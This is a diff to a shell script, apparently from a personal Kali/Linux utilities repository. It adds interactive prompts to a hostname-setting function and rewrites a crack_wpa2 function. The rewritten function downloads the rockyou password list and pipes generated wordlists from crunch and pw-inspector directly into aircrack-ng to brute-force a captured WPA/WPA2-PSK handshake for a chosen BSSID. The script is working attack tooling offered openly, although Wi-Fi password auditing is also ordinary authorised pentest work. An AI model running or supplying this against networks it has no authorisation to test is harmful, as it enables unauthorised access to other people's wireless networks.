@@ -1,4 +1,5 @@
 #!/bin/sh
+# https://github.com/sirmx/linux-scripts.git
 function msg ()
 {
 	local red="\033[01;31m"
@@ -52,10 +53,22 @@ function install_kali ()
 }
 function set_host ()
 {
-	local host_name="$1"
-	local _ip="$2"
-	echo "${host_name}" > /etc/hostname
-	echo "${_ip}    ${host_name}" >> /etc/hosts
+	if [ -z $1 ]
+	then
+		msg "Please provide a hostname:"
+		read _hostname
+		msg "Please provide an IP:"
+		read _ip
+		local host_name=${_hostname}
+		local _ip=${_ip}
+		echo "${host_name}" > /etc/hostname
+		echo "${_ip}    ${host_name}" >> /etc/hosts
+	else
+		local host_name="$1"
+		local _ip="$2"
+		echo "${host_name}" > /etc/hostname
+		echo "${_ip}    ${host_name}" >> /etc/hosts
+	fi
 }
 function clean_up ()
 {
@@ -98,28 +111,21 @@ function crack_wpa2 ()
 	local _bssid="$2"
 	test ! -f ~/rockyou.txt && wget -c https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz
 	tar -xf rockyou.txt.tar.gz
-		msg "Please wait while I generator a wordlist..." 0
-	crunch 8 8 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf >> ~/WORDLIST.txt&  wait $!
-	crunch 12 12 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf >> ~/WORDLIST.txt&  wait $!
+	msg "Cracking WPA/WPA2-PSK...." 0
+	crunch 8 8 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	crunch 12 12 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&-+='|shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	msg "Section: 2" 0
-	cat rockyou.txt| pw-inspector -m 8 -M 16 |shuf >> ~/WORDLIST.txt
+	cat rockyou.txt| pw-inspector -m 8 -M 16 |shuf |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	msg "Section: 3" 0
-	crunch 8 8 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf >> ~/WORDLIST.txt
+	crunch 8 8 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	msg "Section: 4" 0
-	crunch 8 8 -f charset.txt mixalpha-numeric|shuf >> ~/WORDLIST.txt
+	crunch 8 8 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	msg "Section: 5" 0
-	crunch 12 12 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf >> ~/WORDLIST.txt
+	crunch 12 12 -f charset.txt numeric  | pw-inspector -m 8 -M 16 |shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
 	msg "Section: 6" 0
-	crunch 12 12 -f charset.txt mixalpha-numeric|shuf >> ~/WORDLIST.txt
-	msg "Section: 7 - Completed Generating." 0
-	msg "Sorting passlist now and removing duplicates..." 0
-	sort ~/WORDLIST.txt|uniq -u >> ~/WORDLIST.tx
-	msg "Randomizing passlist now..." 0
-	shuf ~/WORDLIST.tx >> ~/WORDLIST.txx
-	mv -v ~/WORDLIST.txx ~/WORDLIST.txt
-	rm -f ~/WORDLIST.tx
-	msg "Passlist completed." 0
-	aircrack-ng -w ~/WORDLIST.txt -b ${_bssid} -${_wpa_file}
+	crunch 12 12 -f charset.txt mixalpha-numeric|shuf  |aircrack-ng -w - -b ${_bssid} ${_wpa_file}
+	msg "Section: 7 - Completed." 0
+	msg "WPA/WPA2-PSK brute force completed."
 }
 function menu ()
 {
